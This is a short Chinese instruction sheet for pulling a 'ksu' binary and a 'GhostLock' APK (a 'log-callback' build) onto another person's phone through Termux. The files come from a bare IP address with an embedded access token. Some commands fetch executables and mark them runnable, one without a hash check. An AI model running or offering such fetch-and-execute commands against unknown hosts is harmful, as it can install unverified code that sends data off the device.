对方手机从服务器拉 ksu 包（Termux 里执行，不用传文件）。

============================================================
方式一：SHA256 校验后执行（推荐，防止包损坏/被篡改）
============================================================
TOKEN='43ZpasqEKBYS_8xQAK5Slv5A'
curl -sL "http://118.31.17.194:9955/dl/ksu?token=$TOKEN" -o ~/ksu
GOT=$(sha256sum ~/ksu | cut -d' ' -f1)
echo "下载 hash: $GOT"
[ "$GOT" = "c1a5b3a5f8497d7509a6b13dc157f1bced8c1a0916432eed120ba696be644c97" ] \
  && echo "OK: 包完整" \
  && chmod 755 ~/ksu \
  || echo "FAIL: hash 不符，删掉重下，别执行"

============================================================
方式二：一条命令直接拉（省事，但建议还是校验一下）
============================================================
curl -sL 'http://118.31.17.194:9955/dl/ksu?token=43ZpasqEKBYS_8xQAK5Slv5A' -o ~/ksu && chmod 755 ~/ksu && ls -l ~/ksu

============================================================
拉 GhostLock APK（22.5MB，日志回传版）
============================================================
curl -sL 'http://118.31.17.194:9955/dl/GhostLock-S15.apk?token=43ZpasqEKBYS_8xQAK5Slv5A' -o ~/GhostLock.apk && ls -l ~/GhostLock.apk
APK hash 应为: ec91f194a429782b852c6c77ec1ba033084958abdefef993176e8bb763c136e7

============================================================
说明
============================================================
- 用 Termux 自己的 home（~/），不需要 /sdcard 存储权限。
- 没 curl 先装：pkg install -y curl
- 服务器响应头带 X-File-SHA256，也可以这样看：
  curl -sI 'http://118.31.17.194:9955/dl/ksu?token=43ZpasqEKBYS_8xQAK5Slv5A' | grep -i sha256
- 无 token 会返回 401，是正常的鉴权保护。
- ksu 包 5,201,901 bytes，SHA256 c1a5b3a5...644c97（与本地清单一致）。
